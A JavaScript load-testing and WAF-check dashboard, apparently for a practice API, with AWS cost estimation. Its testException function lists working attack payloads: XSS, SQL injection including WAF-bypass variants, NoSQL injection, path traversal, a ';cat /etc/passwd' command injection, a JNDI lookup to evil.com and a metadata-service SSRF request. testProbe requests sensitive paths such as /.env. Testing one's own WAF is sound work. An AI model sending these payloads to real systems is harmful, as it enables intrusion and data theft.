// ===== State =====
let running = false;
let stats = { user: { total: 0, success: 0, fast: 0, sum: 0, count: 0 }, product: { total: 0, success: 0, fast: 0, sum: 0, count: 0 }, stress: { total: 0, success: 0, fast: 0, sum: 0, count: 0 }, exception: { total: 0, success: 0 }, image: { total: 0, success: 0 }, probe: { total: 0, blocked: 0, notfound: 0, badreq: 0, passed: 0, other: 0 } };
let workers = [];
let uiTimer = null;
var uploadedImages = [];

function resetStats() {
  stats = { user: { total: 0, success: 0, fast: 0, sum: 0, count: 0 }, product: { total: 0, success: 0, fast: 0, sum: 0, count: 0 }, stress: { total: 0, success: 0, fast: 0, sum: 0, count: 0 }, exception: { total: 0, success: 0 }, image: { total: 0, success: 0 }, probe: { total: 0, blocked: 0, notfound: 0, badreq: 0, passed: 0, other: 0 } };
  uploadedImages = [];
  updateUI();
}

function log(msg, isError) {
  const box = document.getElementById('logBox');
  const line = document.createElement('div');
  line.className = isError ? 'log-error' : 'log-line';
  line.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
  box.appendChild(line);
  box.scrollTop = box.scrollHeight;
  if (box.children.length > 200) box.removeChild(box.firstChild);
}

// ===== Load Test =====
async function sendRequest(api, url, opts) {
  var method = (opts && opts.method) || 'GET';
  var proxyUrl = '/proxy?url=' + encodeURIComponent(url);
  var fetchOpts = { method: method, headers: {} };
  if (opts && opts.body) {
    fetchOpts.body = opts.body;
    // opts.contentType 이 있으면 그걸 쓰고, 없으면 JSON (멀티파트는 caller가 지정)
    fetchOpts.headers['Content-Type'] = (opts.contentType) || 'application/json';
  }

  try {
    var res = await fetch(proxyUrl, fetchOpts);
    var data = await res.json();

    var status = data.status || 0;
    var ms = data.ms || 5000;

    stats[api].total++;
    stats[api].sum += ms;
    stats[api].count++;

    if (status >= 200 && status < 300) {
      stats[api].success++;
      var threshold = api === 'stress' ? 1000 : 200;
      if (ms <= threshold) stats[api].fast++;
    }
    return { ok: status >= 200 && status < 300, status: status, ms: ms };
  } catch (e) {
    stats[api].total++;
    stats[api].sum += 5000;
    stats[api].count++;
    return { ok: false, status: 0, ms: 5000 };
  }
}

async function testUser(endpoint) {
  var rnd = Math.floor(Math.random() * 1000) + 1;
  var rid = Date.now().toString();
  var uuid = crypto.randomUUID();
  var url = endpoint + '/v1/user?email=dbdump' + rnd + '%40example.org&requestid=' + rid + '&uuid=' + uuid;
  return sendRequest('user', url, { method: 'GET' });
}

async function testProduct(endpoint) {
  var rnd = Math.floor(Math.random() * 1000) + 1;
  var rid = Date.now().toString();
  var uuid = crypto.randomUUID();
  // POST로 product 생성
  var url = endpoint + '/v1/product';
  return sendRequest('product', url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ requestid: rid, uuid: uuid, id: 'loadtest' + rnd, name: 'test' + rnd, price: 1000 })
  });
}

// 1x1 투명 PNG (base64)
var TINY_PNG_B64 = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';

function b64ToBytes(b64) {
  var bin = atob(b64);
  var bytes = new Uint8Array(bin.length);
  for (var i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
  return bytes;
}

async function uploadProductImage(endpoint) {
  var rnd = Math.floor(Math.random() * 1000) + 1;
  var id = 'loadtest' + rnd;
  var rid = Date.now().toString();
  var uuid = crypto.randomUUID();

  // 먼저 product 를 생성(없으면 PUT 대상이 없을 수 있음)
  await sendRequest('product', endpoint + '/v1/product', {
    method: 'POST',
    body: JSON.stringify({ requestid: rid, uuid: uuid, id: id, name: id, price: 1000 })
  });

  // multipart 로 이미지 PUT
  var fd = new FormData();
  fd.append('requestid', rid);
  fd.append('uuid', uuid);
  fd.append('id', id);
  fd.append('image', new Blob([b64ToBytes(TINY_PNG_B64)], { type: 'image/png' }), id + '.png');

  var proxyUrl = '/proxy?url=' + encodeURIComponent(endpoint + '/v1/product');
  try {
    // FormData → 브라우저가 boundary 포함 Content-Type 자동 설정 (직접 설정 금지)
    var res = await fetch(proxyUrl, { method: 'PUT', body: fd });
    var data = await res.json();
    var status = data.status || 0;
    stats.product.total++;
    stats.product.count++;
    stats.product.sum += (data.ms || 0);
    if (status >= 200 && status < 300) {
      stats.product.success++;
      if ((data.ms || 9999) <= 200) stats.product.fast++;
      // 응답 body 에서 이미지 경로 추출 (image_path 또는 path)
      var m = (data.body || '').match(/([\w\-./]+\.(jpg|jpeg|png|gif|webp))/i);
      var p;
      if (m) {
        p = m[1].replace(/^.*images\//, '').replace(/^\/+/, '');
      } else {
        p = id + '.png';
      }
      if (p && uploadedImages.indexOf(p) === -1) uploadedImages.push(p);
    }
    return { status: status };
  } catch (e) {
    stats.product.total++; stats.product.count++; stats.product.sum += 5000;
    return { status: 0 };
  }
}

async function testStress(endpoint, length) {
  var rid = Date.now().toString();
  var uuid = crypto.randomUUID();
  var url = endpoint + '/v1/stress';
  return sendRequest('stress', url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ requestid: rid, uuid: uuid, length: length })
  });
}

async function testException(endpoint) {
  // 비정상(악성) 요청. 문제지: 사용자 제공 엔드포인트로의 비정상 요청은 403 으로 차단되어야 함.
  // → 명확한 공격 시그니처만 사용 (파라미터 누락/valid-notfound 같은 정상 요청은 제외).
  var attacks = [
    // --- 기본 패턴 (managed rules 가 보통 잡음) ---
    { path: '/v1/user?email=' + encodeURIComponent('\x3cscript\x3ealert(1)\x3c/script\x3e') + '&requestid=1&uuid=1', method: 'GET' },
    { path: '/v1/user?email=' + encodeURIComponent('"\x3e\x3cimg src=x onerror=alert(1)\x3e') + '&requestid=1&uuid=1', method: 'GET' },
    { path: "/v1/user?email=' OR 1=1 --&requestid=1&uuid=1", method: 'GET' },
    { path: "/v1/user?email=admin'; DROP TABLE user;--&requestid=1&uuid=1", method: 'GET' },
    { path: "/v1/product?id=1 UNION SELECT * FROM users--&requestid=1&uuid=1", method: 'GET' },
    { path: "/v1/user?email=../../../../etc/passwd&requestid=1&uuid=1", method: 'GET' },
    { path: '/v1/user?email=' + encodeURIComponent('${jndi:ldap://evil.com/a}') + '&requestid=1&uuid=1', method: 'GET' },
    { path: "/v1/user?email=;cat /etc/passwd&requestid=1&uuid=1", method: 'GET' },
    { path: "/v1/product?id=http://169.254.169.254/latest/meta-data&requestid=1&uuid=1", method: 'GET' },
    { path: '/v1/user', method: 'POST', body: JSON.stringify({ requestid: "1", uuid: "1", username: "admin' OR '1'='1", email: "a@b.com" }) },
    { path: '/v1/user', method: 'POST', body: JSON.stringify({ requestid: "1", uuid: "1", username: "\x3cscript\x3ealert(1)\x3c/script\x3e", email: "a@b.com" }) },

    // --- 우회/변형 (managed rules 를 뚫을 수 있는 것 - WAF 허점 탐침) ---
    // 대소문자 섞기
    { path: "/v1/user?email=' Or 1=1 -- &requestid=1&uuid=1", method: 'GET' },
    { path: "/v1/product?id=1 uNiOn sElEcT 1,2,3--&requestid=1&uuid=1", method: 'GET' },
    // 이중 인코딩
    { path: "/v1/user?email=%2527%2520OR%25201%253D1&requestid=1&uuid=1", method: 'GET' },
    // 인라인 주석으로 키워드 분리
    { path: "/v1/product?id=1/**/UNION/**/SELECT/**/1&requestid=1&uuid=1", method: 'GET' },
    // SVG/이벤트 기반 XSS
    { path: '/v1/user?email=' + encodeURIComponent('\x3csvg/onload=alert(1)\x3e') + '&requestid=1&uuid=1', method: 'GET' },
    { path: '/v1/user?email=' + encodeURIComponent('javascript:alert(1)') + '&requestid=1&uuid=1', method: 'GET' },
    // 시간기반 SQLi (body)
    { path: '/v1/product', method: 'POST', body: JSON.stringify({ requestid: "1", uuid: "1", id: "1' OR SLEEP(5)--", name: "x", price: 1 }) },
    // NoSQL / 연산자 인젝션 (body)
    { path: '/v1/user', method: 'POST', body: JSON.stringify({ requestid: "1", uuid: "1", username: { "$ne": null }, email: "a@b.com" }) },
    // 매우 긴 payload + SQLi
    { path: "/v1/user?email=" + 'A'.repeat(3000) + "'OR'1'='1&requestid=1&uuid=1", method: 'GET' },
  ];

  var attack = attacks[Math.floor(Math.random() * attacks.length)];
  var url = endpoint + attack.path;
  try {
    var proxyUrl = '/proxy?url=' + encodeURIComponent(url);
    var fetchOpts = { method: attack.method, headers: {} };
    if (attack.body) { fetchOpts.headers['Content-Type'] = 'application/json'; fetchOpts.body = attack.body; }
    var res = await fetch(proxyUrl, fetchOpts);
    var data = await res.json();
    var status = data.status || 0;

    // status 0 = 프록시 타임아웃/네트워크 오류 → WAF와 무관하므로 카운트 제외
    if (status === 0) {
      return { status: 0 };
    }

    stats.exception.total++;
    // 문제지: 비정상 요청은 403 으로 차단되어야 함
    if (status === 403) {
      stats.exception.success++;
      log('\u{1F6E1}\uFE0F WAF \uCC28\uB2E8 (403): ' + attack.path.substring(0, 55));
    } else {
      log('\u26A0\uFE0F \uBBF8\uCC28\uB2E8 (' + status + '): ' + attack.path.substring(0, 55), true);
    }
    return { status: status };
  } catch(e) {
    stats.exception.total++;
    return { status: 0 };
  }
}

async function testImage(endpoint) {
  // 업로드된 이미지가 있으면 그걸 다운로드, 없으면 먼저 업로드
  if (uploadedImages.length === 0) {
    await uploadProductImage(endpoint);
    if (uploadedImages.length === 0) {
      // 업로드 실패 → 이미지 다운로드 테스트 스킵
      return { ok: false };
    }
  }
  var name = uploadedImages[Math.floor(Math.random() * uploadedImages.length)];
  var url = endpoint + '/images/' + name.replace(/^\/+/, '');
  try {
    var proxyUrl = '/proxy?url=' + encodeURIComponent(url);
    var res = await fetch(proxyUrl);
    var data = await res.json();
    var ms = data.ms || 5000;
    var status = data.status || 0;
    stats.image.total++;
    if (status >= 200 && status < 300 && ms <= 5000) stats.image.success++;
    else log('\u26A0\uFE0F \uC774\uBBF8\uC9C0 \uB2E4\uC6B4\uB85C\uB4DC \uC2E4\uD328 (' + status + '): /images/' + name, true);
    return { ok: status >= 200 && status < 300, ms: ms };
  } catch(e) {
    stats.image.total++;
    return { ok: false, ms: 5000 };
  }
}

async function test404(endpoint) {
  var paths = ['/v1/none', '/random', '/api/unknown', '/v2/user', '/admin', '/v1/delete', '/test'];
  var path = paths[Math.floor(Math.random() * paths.length)];
  var url = endpoint + path;
  try {
    var proxyUrl = '/proxy?url=' + encodeURIComponent(url);
    var res = await fetch(proxyUrl);
    var data = await res.json();
    var status = data.status || 0;
    stats.notfound = stats.notfound || { total: 0, success: 0 };
    stats.notfound.total++;
    if (status === 404) {
      stats.notfound.success++;
    } else {
      log('\u26A0\uFE0F 404 \uBBF8\uBC18\uD658 (' + status + '): ' + path, true);
    }
    return { status: status };
  } catch(e) {
    stats.notfound = stats.notfound || { total: 0, success: 0 };
    stats.notfound.total++;
    return { status: 0 };
  }
}

// 다양한 탐침 요청 — WAF 허점 파악용. 채점 지표(비정상 처리율)엔 섞지 않고
// 응답코드 분포만 별도로 보여준다. 2xx(passed)로 통과하면 "뚫린" 것.
async function testProbe(endpoint) {
  var probes = [
    // 파라미터 누락/변조 (403 또는 400/404 여야 정상)
    { path: '/v1/user?email=a@b.com', method: 'GET' },
    { path: '/v1/product', method: 'GET' },
    { path: '/v1/stress', method: 'GET' },
    // 정의된 API 에 잘못된 메서드
    { path: '/v1/user?email=a@b.com&requestid=1&uuid=1', method: 'DELETE' },
    { path: '/v1/product?id=1&requestid=1&uuid=1', method: 'PUT' },
    { path: '/v1/stress', method: 'GET' },
    // 경로 우회/널바이트/트래버설
    { path: '/v1/user/../admin?requestid=1&uuid=1', method: 'GET' },
    { path: '/v1/user%00.json?email=a@b.com&requestid=1&uuid=1', method: 'GET' },
    { path: '/v1/USER?email=a@b.com&requestid=1&uuid=1', method: 'GET' },
    { path: '/v1/user/?email=a@b.com&requestid=1&uuid=1', method: 'GET' },
    // 민감/스캐너 경로
    { path: '/.env', method: 'GET' },
    { path: '/actuator/health', method: 'GET' },
    { path: '/wp-login.php', method: 'GET' },
    { path: '/../../etc/passwd', method: 'GET' },
    // 헤더 기반 (User-Agent 스캐너 흉내는 프록시가 못 바꾸니 경로로만)
    { path: '/v1/user?email=a@b.com&requestid=1&uuid=1&debug=true', method: 'GET' },
  ];
  var p = probes[Math.floor(Math.random() * probes.length)];
  var url = endpoint + p.path;
  try {
    var proxyUrl = '/proxy?url=' + encodeURIComponent(url);
    var fetchOpts = { method: p.method, headers: {} };
    if (p.body) { fetchOpts.headers['Content-Type'] = 'application/json'; fetchOpts.body = p.body; }
    var res = await fetch(proxyUrl, fetchOpts);
    var data = await res.json();
    var status = data.status || 0;
    if (status === 0) return { status: 0 };  // 프록시 오류 제외
    stats.probe.total++;
    if (status === 403) { stats.probe.blocked++; }
    else if (status === 404) { stats.probe.notfound++; }
    else if (status === 400) { stats.probe.badreq++; }
    else if (status >= 200 && status < 300) {
      stats.probe.passed++;
      log('\uD83D\uDD13 \uD1B5\uacfc\uB428 (' + status + '): ' + p.method + ' ' + p.path.substring(0, 55), true);
    }
    else { stats.probe.other++; log('\u2753 \uD504\uB85C\uBE0C (' + status + '): ' + p.method + ' ' + p.path.substring(0, 50)); }
    return { status: status };
  } catch(e) {
    return { status: 0 };
  }
}

async function runWorker(id) {
  var endpoint = document.getElementById('endpoint').value.replace(/\/$/, '');
  var interval = parseInt(document.getElementById('interval').value);
  var stressLen = parseInt(document.getElementById('stressLength').value);

  while (running) {
    var pick = Math.random();
    if (pick < 0.20) {
      await testUser(endpoint);
    } else if (pick < 0.37) {
      await testProduct(endpoint);
    } else if (pick < 0.49) {
      await testStress(endpoint, stressLen);
    } else if (pick < 0.59) {
      await uploadProductImage(endpoint);   // 이미지 업로드 (S3 채우기)
    } else if (pick < 0.71) {
      await testException(endpoint);        // 명확한 공격 → 403 기대 (비정상 처리율)
    } else if (pick < 0.80) {
      await test404(endpoint);
    } else if (pick < 0.90) {
      await testProbe(endpoint);            // 다양한 탐침 (WAF 허점 파악, 지표 분리)
    } else {
      await testImage(endpoint);            // 이미지 다운로드
    }
    // UI 갱신은 별도 타이머에서 처리(요청 루프를 막지 않음).
    // interval 이 0 이면 지연 없이 다음 요청(마이크로태스크로만 양보).
    if (interval > 0) {
      await new Promise(function(r) { setTimeout(r, interval); });
    }
  }
}

function startTest() {
  var endpoint = document.getElementById('endpoint').value.trim();
  if (!endpoint) { alert('\uC5D4\uB4DC\uD3EC\uC778\uD2B8 URL\uC744 \uC785\uB825\uD558\uC138\uC694'); return; }
  resetStats();
  running = true;
  document.getElementById('btnStart').disabled = true;
  document.getElementById('btnStop').disabled = false;
  log('\uBD80\uD558 \uD14C\uC2A4\uD2B8 \uC2DC\uC791: ' + endpoint);

  var concurrency = parseInt(document.getElementById('concurrency').value);
  var duration = parseInt(document.getElementById('duration').value) * 1000;

  for (var i = 0; i < concurrency; i++) {
    workers.push(runWorker(i));
  }

  // UI 는 요청 루프와 분리해 주기적으로만 갱신(요청 처리량 극대화).
  if (uiTimer) clearInterval(uiTimer);
  uiTimer = setInterval(updateUI, 250);

  setTimeout(function() { if (running) stopTest(); }, duration);
}

function stopTest() {
  running = false;
  document.getElementById('btnStart').disabled = false;
  document.getElementById('btnStop').disabled = true;
  log('\uBD80\uD558 \uD14C\uC2A4\uD2B8 \uC911\uC9C0');
  workers = [];
  if (uiTimer) { clearInterval(uiTimer); uiTimer = null; }
  updateUI();  // \uB9C8\uC9C0\uB9C9 \uCD5C\uC885 \uC9D1\uACC4 \uBC18\uC601
}

// ===== \uC11C\uBC84 \uACE0\uBD80\uD558 (\uB178\uB4DC \uC2A4\uCF00\uC77C\uC6A9) =====
// \uBE0C\uB77C\uC6B0\uC800\uB294 \uC624\uB9AC\uC9C4\uB2F9 \uB3D9\uC2DC \uC5F0\uACB0\uC774 ~6\uAC1C(HTTP/1.1)\uB77C fetch \uB85C\uB294 \uC544\uBB34\uB9AC \uC6CC\uCEE4\uB97C \uB298\uB824\uB3C4
// \uC2E4\uC81C in-flight \uAC00 6\uAC1C\uBFD0\uC774\uB77C \uB178\uB4DC\uAC00 \uC798 \uC548 \uB298\uC5B4\uB09C\uB2E4. \uC774 \uBC84\uD2BC\uC740 server.py \uAC00 \uC2A4\uB808\uB4DC\uD480\uB85C
// \uC9C1\uC811 \uC694\uCCAD\uC744 \uC3D8\uAC8C \uD574\uC11C(\uBE0C\uB77C\uC6B0\uC800 \uC81C\uD55C\uACFC \uBB34\uAD00) \uC2E4\uC81C \uBD80\uD558\uB97C \uD06C\uAC8C \uC62C\uB9B0\uB2E4.
// \uC704\uCABD \uBE0C\uB77C\uC6B0\uC800 \uD14C\uC2A4\uD2B8/\uCC44\uC810 \uB85C\uC9C1\uACFC\uB294 \uC644\uC804\uD788 \uBD84\uB9AC(\uCE21\uC815\uAC12\uC5D0 \uC601\uD5A5 \uC5C6\uC74C).
var blastTimer = null;
var blastPrevTotal = 0, blastPrevT = 0;

function serverTotal(s) {
  if (!s) return 0;
  var keys = ['user', 'product', 'stress', 'exception', 'image', 'notfound'];
  var t = 0;
  for (var i = 0; i < keys.length; i++) { if (s[keys[i]]) t += (s[keys[i]].total || 0); }
  return t;
}

function startServerLoad() {
  var endpoint = document.getElementById('endpoint').value.trim();
  if (!endpoint) { alert('\uC5D4\uB4DC\uD3EC\uC778\uD2B8 URL\uC744 \uC785\uB825\uD558\uC138\uC694'); return; }
  var cfg = {
    endpoint: endpoint,
    concurrency: parseInt(document.getElementById('concurrency').value),
    duration: parseInt(document.getElementById('duration').value),
    interval: parseInt(document.getElementById('interval').value) || 0,
    stressLength: parseInt(document.getElementById('stressLength').value)
  };
  document.getElementById('btnBlast').disabled = true;
  document.getElementById('btnBlastStop').disabled = false;
  document.getElementById('blastStatus').textContent = '\uC2DC\uC791 \uC911...';
  log('\uD83D\uDE80 \uC11C\uBC84 \uACE0\uBD80\uD558 \uC2DC\uC791 (\uC6CC\uCEE4 ' + cfg.concurrency + '): ' + endpoint);
  fetch('/load/start', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(cfg) })
    .then(function(r) { return r.json(); })
    .then(function(d) { log('\uC11C\uBC84 \uC6CC\uCEE4 ' + (d.workers || cfg.concurrency) + '\uAC1C \uAC00\uB3D9 \u2014 \uBE0C\uB77C\uC6B0\uC800 \uC5F0\uACB0 \uC81C\uD55C \uC6B0\uD68C'); })
    .catch(function(e) { log('\uC11C\uBC84 \uACE0\uBD80\uD558 \uC2DC\uC791 \uC2E4\uD328(server.py \uCD5C\uC2E0\uC778\uC9C0 \uD655\uC778): ' + e, true); stopServerLoad(true); });
  blastPrevTotal = 0; blastPrevT = Date.now();
  if (blastTimer) clearInterval(blastTimer);
  blastTimer = setInterval(pollServerLoad, 1000);
}

function pollServerLoad() {
  fetch('/load/stats').then(function(r) { return r.json(); }).then(function(d) {
    var tot = serverTotal(d.stats);
    var now = Date.now();
    var rps = blastPrevT ? Math.round((tot - blastPrevTotal) * 1000 / (now - blastPrevT)) : 0;
    blastPrevTotal = tot; blastPrevT = now;
    document.getElementById('blastStatus').textContent = '\uB204\uC801 ' + tot + '\uAC74 \u00B7 ~' + rps + ' req/s' + (d.running ? '' : ' \u00B7 \uC885\uB8CC\uB428');
    if (!d.running) { stopServerLoad(true); }
  }).catch(function() {});
}

function stopServerLoad(auto) {
  document.getElementById('btnBlast').disabled = false;
  document.getElementById('btnBlastStop').disabled = true;
  if (blastTimer) { clearInterval(blastTimer); blastTimer = null; }
  if (!auto) {
    fetch('/load/stop', { method: 'POST' }).catch(function() {});
    log('\uD83D\uDE80 \uC11C\uBC84 \uACE0\uBD80\uD558 \uC911\uC9C0');
  }
}

// ===== UI Update =====
function updateUI() {
  var total = stats.user.total + stats.product.total + stats.stress.total + stats.exception.total + stats.image.total;
  var success = stats.user.success + stats.product.success + stats.stress.success + stats.exception.success + stats.image.success;
  var fail = total - success;
  var timeSum = stats.user.sum + stats.product.sum + stats.stress.sum;
  var timeCount = stats.user.count + stats.product.count + stats.stress.count;
  var avgMs = timeCount ? (timeSum / timeCount).toFixed(0) : 0;

  document.getElementById('statTotal').textContent = total;
  document.getElementById('statSuccess').textContent = success;
  document.getElementById('statFail').textContent = fail;
  document.getElementById('statAvgMs').textContent = avgMs + 'ms';

  var tbody = document.getElementById('apiResults');
  var apis = ['user', 'product', 'stress'];
  var html = '';
  for (var idx = 0; idx < apis.length; idx++) {
    var api = apis[idx];
    var s = stats[api];
    var avail = s.total ? ((s.success / s.total) * 100).toFixed(1) : '-';
    var perf = s.total ? ((s.fast / s.total) * 100).toFixed(1) : '-';
    var avg = s.count ? (s.sum / s.count).toFixed(0) + 'ms' : '-';
    html += '<tr><td>' + api + '</td><td>' + s.total + '</td><td>' + s.success + '</td><td>' + avail + '%</td><td>' + perf + '%</td><td>' + avg + '</td></tr>';
  }

  var wafRate = stats.exception.total ? ((stats.exception.success / stats.exception.total) * 100).toFixed(1) : '-';
  html += '<tr><td>\u{1F6E1}\uFE0F WAF (\u21923)</td><td>' + stats.exception.total + '</td><td>' + stats.exception.success + '</td><td>' + wafRate + '%</td><td colspan="2">' + stats.exception.success + '/' + stats.exception.total + ' \uCC28\uB2E8</td></tr>';

  var nf = stats.notfound || { total: 0, success: 0 };
  var nfRate = nf.total ? ((nf.success / nf.total) * 100).toFixed(1) : '-';
  html += '<tr><td>\uD83D\uDEAB 404</td><td>' + nf.total + '</td><td>' + nf.success + '</td><td>' + nfRate + '%</td><td colspan="2">' + nf.success + '/' + nf.total + ' \uC815\uC0C1 404</td></tr>';

  var imgRate2 = stats.image.total ? ((stats.image.success / stats.image.total) * 100).toFixed(1) : '-';
  html += '<tr><td>\uD83D\uDDBC\uFE0F \uC774\uBBF8\uC9C0</td><td>' + stats.image.total + '</td><td>' + stats.image.success + '</td><td>' + imgRate2 + '%</td><td colspan="2">' + stats.image.success + '/' + stats.image.total + ' \uC131\uACF5</td></tr>';

  // 프로브 (WAF 허점 탐침) — 응답 분포. passed(2xx)가 있으면 뚫린 것.
  var pb = stats.probe || { total: 0, blocked: 0, notfound: 0, badreq: 0, passed: 0, other: 0 };
  var pbDetail = '403:' + pb.blocked + ' 404:' + pb.notfound + ' 400:' + pb.badreq + ' 2xx:' + pb.passed + ' \uae30\ud0c0:' + pb.other;
  var pbColor = pb.passed > 0 ? 'color:#ff4757' : 'color:#7bed9f';
  html += '<tr><td>\uD83D\uDD0D \uD504\uB85C\uBE0C</td><td>' + pb.total + '</td><td style="' + pbColor + '">' + pb.passed + ' \ud1b5\uacfc</td><td colspan="3">' + pbDetail + '</td></tr>';

  tbody.innerHTML = html;
}

// ===== Cost Calculator =====
var EC2_PRICING = {
  't3.nano': 0.0068, 't3.micro': 0.0132, 't3.small': 0.0264, 't3.medium': 0.0464,
  't3.large': 0.0928, 't3.xlarge': 0.1856, 't3.2xlarge': 0.3712,
  't3a.nano': 0.0061, 't3a.micro': 0.0118, 't3a.small': 0.0236, 't3a.medium': 0.0416,
  't3a.large': 0.0832, 't3a.xlarge': 0.1664, 't3a.2xlarge': 0.3328,
  'm5.large': 0.118, 'm5.xlarge': 0.236, 'm5.2xlarge': 0.472,
  'c5.large': 0.098, 'c5.xlarge': 0.196, 'c5.2xlarge': 0.392,
  'r5.large': 0.152, 'r5.xlarge': 0.304
};

var detectedInstances = [];

// AWS Signature V4 helper
function getSignatureKey(key, dateStamp, regionName, serviceName) {
  var kDate = hmacSHA256(utf8Encode('AWS4' + key), utf8Encode(dateStamp));
  var kRegion = hmacSHA256(kDate, utf8Encode(regionName));
  var kService = hmacSHA256(kRegion, utf8Encode(serviceName));
  var kSigning = hmacSHA256(kService, utf8Encode('aws4_request'));
  return kSigning;
}

function utf8Encode(str) {
  return new TextEncoder().encode(str);
}

async function hmacSHA256(key, data) {
  var cryptoKey = await crypto.subtle.importKey('raw', key instanceof ArrayBuffer ? key : key.buffer || key, { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']);
  var sig = await crypto.subtle.sign('HMAC', cryptoKey, data instanceof ArrayBuffer ? data : data.buffer || data);
  return new Uint8Array(sig);
}

async function sha256(data) {
  var encoded = typeof data === 'string' ? utf8Encode(data) : data;
  var hash = await crypto.subtle.digest('SHA-256', encoded);
  return Array.from(new Uint8Array(hash)).map(function(b) { return b.toString(16).padStart(2, '0'); }).join('');
}

function toHex(arr) {
  return Array.from(arr).map(function(b) { return b.toString(16).padStart(2, '0'); }).join('');
}

async function awsRequest(accessKey, secretKey, region, service, action, params) {
  var host = service + '.' + region + '.amazonaws.com';
  var endpoint = 'https://' + host;
  var now = new Date();
  var amzDate = now.toISOString().replace(/[:-]|\.\d{3}/g, '');
  var dateStamp = amzDate.substring(0, 8);

  // Build query string
  var queryParams = Object.assign({ Action: action, Version: '2016-11-15' }, params);
  var sortedKeys = Object.keys(queryParams).sort();
  var queryString = sortedKeys.map(function(k) { return encodeURIComponent(k) + '=' + encodeURIComponent(queryParams[k]); }).join('&');

  var headers = {
    'host': host,
    'x-amz-date': amzDate
  };
  var signedHeaders = 'host;x-amz-date';
  var payloadHash = await sha256('');

  var canonicalRequest = 'GET\n/\n' + queryString + '\nhost:' + host + '\nx-amz-date:' + amzDate + '\n\n' + signedHeaders + '\n' + payloadHash;
  var credentialScope = dateStamp + '/' + region + '/' + service + '/aws4_request';
  var stringToSign = 'AWS4-HMAC-SHA256\n' + amzDate + '\n' + credentialScope + '\n' + (await sha256(canonicalRequest));

  var kDate = await hmacSHA256(utf8Encode('AWS4' + secretKey), utf8Encode(dateStamp));
  var kRegion = await hmacSHA256(kDate, utf8Encode(region));
  var kService2 = await hmacSHA256(kRegion, utf8Encode(service));
  var kSigning = await hmacSHA256(kService2, utf8Encode('aws4_request'));
  var signature = toHex(await hmacSHA256(kSigning, utf8Encode(stringToSign)));

  var authHeader = 'AWS4-HMAC-SHA256 Credential=' + accessKey + '/' + credentialScope + ', SignedHeaders=' + signedHeaders + ', Signature=' + signature;

  var resp = await fetch(endpoint + '/?' + queryString, {
    method: 'GET',
    headers: {
      'X-Amz-Date': amzDate,
      'Authorization': authHeader
    }
  });
  return await resp.text();
}

async function detectInstances() {
  var accessKey = document.getElementById('awsAccessKey').value.trim();
  var secretKey = document.getElementById('awsSecretKey').value.trim();
  var region = document.getElementById('awsRegion').value.trim();

  if (!accessKey || !secretKey) {
    log('\u26A0\uFE0F Access Key\uC640 Secret Key\uB97C \uC785\uB825\uD558\uC138\uC694', true);
    return;
  }

  log('\uD83D\uDD0D EC2 \uC778\uC2A4\uD134\uC2A4 \uC870\uD68C \uC911...');

  try {
    var params = {
      'Filter.1.Name': 'instance-state-name',
      'Filter.1.Value.1': 'running'
    };

    var xmlText = await awsRequest(accessKey, secretKey, region, 'ec2', 'DescribeInstances', params);
    var parser = new DOMParser();
    var xml = parser.parseFromString(xmlText, 'text/xml');

    // Check for errors
    var errors = xml.getElementsByTagName('Error');
    if (errors.length > 0) {
      var errMsg = errors[0].getElementsByTagName('Message')[0].textContent;
      log('\u274C AWS \uC624\uB958: ' + errMsg, true);
      return;
    }

    var items = xml.getElementsByTagName('item');
    detectedInstances = [];

    for (var i = 0; i < items.length; i++) {
      var item = items[i];
      // Only process instance items (has instanceId)
      var instanceIdEl = item.getElementsByTagName('instanceId');
      var instanceTypeEl = item.getElementsByTagName('instanceType');
      if (instanceIdEl.length === 0 || instanceTypeEl.length === 0) continue;

      var instanceId = instanceIdEl[0].textContent;
      var instanceType = instanceTypeEl[0].textContent;

      // Get Name tag
      var name = '';
      var tagSets = item.getElementsByTagName('tagSet');
      if (tagSets.length > 0) {
        var tags = tagSets[0].getElementsByTagName('item');
        for (var t = 0; t < tags.length; t++) {
          var keyEl = tags[t].getElementsByTagName('key');
          var valEl = tags[t].getElementsByTagName('value');
          if (keyEl.length > 0 && keyEl[0].textContent === 'Name' && valEl.length > 0) {
            name = valEl[0].textContent;
          }
        }
      }

      // Avoid duplicates
      var exists = false;
      for (var d = 0; d < detectedInstances.length; d++) {
        if (detectedInstances[d].id === instanceId) { exists = true; break; }
      }
      if (!exists) {
        detectedInstances.push({ id: instanceId, type: instanceType, state: 'running', name: name });
      }
    }

    renderInstances();
    calcCost();
    log('\u2705 ' + detectedInstances.length + '\uAC1C \uC2E4\uD589 \uC911 \uC778\uC2A4\uD134\uC2A4 \uAC10\uC9C0 \uC644\uB8CC');

  } catch(e) {
    log('\u274C \uC624\uB958: ' + e.message, true);
  }
}

function renderInstances() {
  document.getElementById('detectedInstances').style.display = 'block';
  var tbody = document.getElementById('instanceBody');
  var html = '';
  for (var i = 0; i < detectedInstances.length; i++) {
    var inst = detectedInstances[i];
    var price = EC2_PRICING[inst.type] || 0;
    html += '<tr><td>' + inst.id + '</td><td>' + inst.type + '</td><td style="color:#2ed573">' + inst.state + '</td><td>' + (inst.name || '-') + '</td><td>$' + price.toFixed(4) + '</td></tr>';
  }
  tbody.innerHTML = html;
}

function calcCost() {
  var hours = parseInt(document.getElementById('runHours').value);
  var rdsType = document.getElementById('rdsType').value;
  var rdsPrice = rdsType === 'multi-az' ? 0.056 : 0.028;

  var ec2CostPerHour = 0;
  if (detectedInstances.length > 0) {
    for (var i = 0; i < detectedInstances.length; i++) {
      ec2CostPerHour += (EC2_PRICING[detectedInstances[i].type] || 0);
    }
  } else {
    ec2CostPerHour = 2 * 0.0464;
  }

  var totalPerHour = ec2CostPerHour + rdsPrice;
  var baseCostPerHour = 2 * 0.0464;
  var ratio = baseCostPerHour > 0 ? ec2CostPerHour / baseCostPerHour : 0;

  document.getElementById('costResult').style.display = 'block';
  document.getElementById('costNodes').textContent = detectedInstances.length || 2;
  document.getElementById('costNodeVal').textContent = '$' + ec2CostPerHour.toFixed(4) + '/hr';
  document.getElementById('costRdsVal').textContent = '$' + rdsPrice.toFixed(4) + '/hr';
